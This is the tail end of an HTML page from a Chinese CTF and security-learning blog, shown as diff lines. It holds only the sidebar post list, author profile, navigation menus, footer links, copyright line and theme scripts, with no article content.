+          <li><a href="/posts/384200ef.html" rel="bookmark" title="SQL无列名注入">SQL无列名注入</a></li><li><a href="/posts/88915f6f.html" rel="bookmark" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></li><li><a href="/posts/2f610211.html" rel="bookmark" title="反弹shell">反弹shell</a></li><li><a href="/posts/ff5b88d5.html" rel="bookmark" title="python原型链污染">python原型链污染</a></li><li><a href="/posts/97a7dff3.html" rel="bookmark" title="ctfshow-信息搜集">ctfshow-信息搜集</a></li><li><a href="/posts/53e2b2e1.html" rel="bookmark" title="ctfshow-命令执行">ctfshow-命令执行</a></li><li><a href="/posts/4fb535d6.html" rel="bookmark" title="ctfshow-反序列化">ctfshow-反序列化</a></li><li><a href="/posts/b856856d.html" rel="bookmark" title="ctfshow-ssrf">ctfshow-ssrf</a></li><li><a href="/posts/ad175165.html" rel="bookmark" title="ctfshow-文件包含">ctfshow-文件包含</a></li><li class="active"><a href="/posts/4826d2ce.html" rel="bookmark" title="ctfshow-SSTI">ctfshow-SSTI</a></li><li><a href="/posts/2d792864.html" rel="bookmark" title="Python栈帧逃逸">Python栈帧逃逸</a></li><li><a href="/posts/b3ad4123.html" rel="bookmark" title="有小考点的Web题">有小考点的Web题</a></li><li><a href="/posts/a4378bd0.html" rel="bookmark" title="【2025】LitCTF">【2025】LitCTF</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/cf99ed43.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/2d792864.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/97a7dff3.html" title="ctfshow-信息搜集">ctfshow-信息搜集</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/52965aaa.html" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/4826d2ce.html" title="ctfshow-SSTI">ctfshow-SSTI</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/f1497b96.html" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/4fb535d6.html" title="ctfshow-反序列化">ctfshow-反序列化</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
+</div>
+
+    <span><a href="/posts/2c763aa6.html" title="数据结构-3、栈、队列和数组">数据结构-3、栈、队列和数组</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/fe4eec6d.html" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/b856856d.html" title="ctfshow-ssrf">ctfshow-ssrf</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/4bf5e0ee.html" title="【2024】LitCTF">【2024】LitCTF</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/4826d2ce.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
